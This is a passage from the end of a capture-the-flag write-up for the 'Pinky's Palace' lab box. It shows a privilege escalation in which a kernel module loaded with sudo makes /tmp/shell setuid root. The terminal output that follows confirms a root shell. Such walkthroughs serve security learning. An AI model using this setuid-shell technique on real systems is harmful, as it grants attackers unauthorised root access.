chown root:root /tmp/shell; chmod u+s /tmp/shell  
```  
We can see the full exploit process here, as the exploit is run at module load time.
```bash  
pinky@pinkys-palace:~/pinkit$ ls -la /tmp/shell  
-rwxr-xr-x 1 pinky pinky 7540 May 28 11:39 /tmp/shell  
pinky@pinkys-palace:~/pinkit$ sudo insmod pinkit.ko  
pinky@pinkys-palace:~/pinkit$ ls -la /tmp/shell  
-rwsr-xr-x 1 root root 7540 May 28 11:39 /tmp/shell  
pinky@pinkys-palace:~/pinkit$ /tmp/shell  
ID: 0  
# id  
uid=0(root) gid=1000(pinky) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)  
```

And there we have it!

![](https://pbs.twimg.com/media/DeQM_peWAAAgJov.jpg:large)

Many thanks to [@Pink_P4nther](https://twitter.com/@Pink_P4nther), a very well designed box.
